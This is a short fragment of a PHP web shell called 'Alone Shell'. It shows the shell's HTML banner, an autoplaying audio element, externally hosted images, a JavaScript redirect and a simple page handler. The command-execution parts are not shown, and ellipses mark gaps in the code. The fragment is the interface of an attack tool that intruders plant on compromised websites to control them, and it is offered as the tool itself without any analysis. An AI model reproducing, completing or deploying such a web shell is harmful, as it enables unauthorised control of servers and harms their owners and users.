...
echo "<script>window.location='?AloneXcode'</script>";
}
if($_GET['page'] == "blank") {
echo "<a href='?'>Back</a>";
exit();
...
<body bgcolor="black">
	<center><img src="https://k.top4top.io/p_1789r0r520.png" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ Welcome To</font><font color="white" face="Patrick Hand"> Alone Shell]=-</font><br>
</center>
<center><audio autoplay="autoplay" controls="controls" src="https://g.top4top.io/m_1755774le9.mp3"type="audio/mpeg"></audio></center>
